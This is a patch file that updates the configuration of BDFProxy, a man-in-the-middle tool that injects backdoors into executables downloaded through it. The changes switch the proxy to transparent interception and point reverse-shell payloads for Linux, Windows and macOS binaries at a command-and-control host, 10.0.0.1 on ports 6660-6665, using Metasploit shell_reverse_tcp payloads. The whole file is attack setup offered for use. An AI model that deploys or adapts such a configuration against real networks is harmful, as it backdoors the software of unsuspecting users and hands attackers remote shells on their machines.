@@ -1,44 +1,77 @@
-35c35
-< transparentProxy = None  # Modes: None, socks5, transparent, reverse, upstream
----
-> transparentProxy = transparent  # Modes: None, socks5, transparent, reverse, upstream
-38c38
-< proxyPort = 8080
----
-> proxyPort = 9998
-107,108c107,108
-< 		HOST = 192.168.1.168 		# The C2
-< 		PORT = 8888
----
-> 		HOST = 10.0.0.1 		# The C2
-> 		PORT = 6660
-114,115c114,115
-< 		HOST = 192.168.1.16
-< 		PORT = 9999
----
-> 		HOST = 10.0.0.1
-> 		PORT = 6661
-123,124c123,124
-< 		HOST = 192.168.1.16
-< 		PORT = 8443
----
-> 		HOST = 10.0.0.1 # WindowsIntelx86 Metasploit IP
-> 		PORT = 6662
-135,136c135,136
-< 		HOST = 192.168.1.16
-< 		PORT = 8088
----
-> 		HOST = 10.0.0.1 # WindowsIntelx64 Metasploit IP
-> 		PORT = 6663
-145,146c145,146
-< 		HOST = 192.168.1.16
-< 		PORT = 4444
----
-> 		HOST = 10.0.0.1
-> 		PORT = 6664
-152,153c152,153
-< 		HOST = 192.168.1.16
-< 		PORT = 5555
----
-> 		HOST = 10.0.0.1
-> 		PORT = 6665
+--- bdfproxy.cfg.orig	2016-04-28 09:51:03.328425185 +0100
++++ bdfproxy.cfg.NEW	2016-04-28 10:01:59.743531727 +0100
+@@ -32,10 +32,10 @@
+ #
+ 
+ [Overall]
+-proxyMode = regular  # Modes: regular or None (for libmproxy < 13), socks5, transparent, reverse, upstream
++proxyMode = transparent  # Modes: regular or None (for libmproxy < 13), socks5, transparent, reverse, upstream
+ MaxSizeFileRequested = 100000000 # will send a 502 request of large content to the client (server error)
+ certLocation = ~/.mitmproxy/mitmproxy-ca.pem
+-proxyPort = 8080
++proxyPort = 9998
+ sslports = 443, 8443
+ loglevel = INFO
+ logname = proxy.log
+@@ -104,15 +104,15 @@
+ 	CompressedFiles = True #True/False
+ 		[[[LinuxIntelx86]]]
+ 		SHELL = reverse_shell_tcp   # This is the BDF syntax
+-		HOST = 192.168.1.168 		# The C2
+-		PORT = 8888
++		HOST = 10.0.0.1 		# The C2
++		PORT = 6660
+ 		SUPPLIED_SHELLCODE = None
+ 		MSFPAYLOAD = linux/x86/shell_reverse_tcp	# MSF syntax
+ 		
+ 		[[[LinuxIntelx64]]]
+ 		SHELL = reverse_shell_tcp
+-		HOST = 192.168.1.16
+-		PORT = 9999
++		HOST = 10.0.0.1
++		PORT = 6661
+ 		SUPPLIED_SHELLCODE = None
+ 		MSFPAYLOAD = linux/x64/shell_reverse_tcp
+ 
+@@ -120,8 +120,8 @@
+ 		PATCH_TYPE = APPEND #JUMP/SINGLE/APPEND
+ 		# PATCH_METHOD overwrites PATCH_TYPE, use automatic, replace, or onionduke
+ 		PATCH_METHOD = automatic
+-		HOST = 192.168.1.16
+-		PORT = 8090
++		HOST = 10.0.0.1
++		PORT = 6662
+ 		# SHELL for use with automatic PATCH_METHOD
+ 		SHELL = iat_reverse_tcp_stager_threaded
+ 		# SUPPLIED_SHELLCODE for use with a user_supplied_shellcode payload
+@@ -146,8 +146,8 @@
+ 		PATCH_TYPE = APPEND #JUMP/SINGLE/APPEND
+ 		# PATCH_METHOD overwrites PATCH_TYPE, use automatic or onionduke
+ 		PATCH_METHOD = automatic
+-		HOST = 192.168.1.16
+-		PORT = 8088
++		HOST = 10.0.0.1
++		PORT = 6663
+ 		# SHELL for use with automatic PATCH_METHOD
+ 		SHELL = iat_reverse_tcp_stager_threaded
+ 		# SUPPLIED_SHELLCODE for use with a user_supplied_shellcode payload
+@@ -167,15 +167,15 @@
+ 
+ 		[[[MachoIntelx86]]]
+ 		SHELL = reverse_shell_tcp
+-		HOST = 192.168.1.16
+-		PORT = 4444
++		HOST = 10.0.0.1
++		PORT = 6664
+ 		SUPPLIED_SHELLCODE = None
+ 		MSFPAYLOAD = linux/x64/shell_reverse_tcp
+ 
+ 		[[[MachoIntelx64]]]
+ 		SHELL = reverse_shell_tcp
+-		HOST = 192.168.1.16
+-		PORT = 5555
++		HOST = 10.0.0.1
++		PORT = 6665
+ 		SUPPLIED_SHELLCODE = None
+ 		MSFPAYLOAD = linux/x64/shell_reverse_tcp
+ 
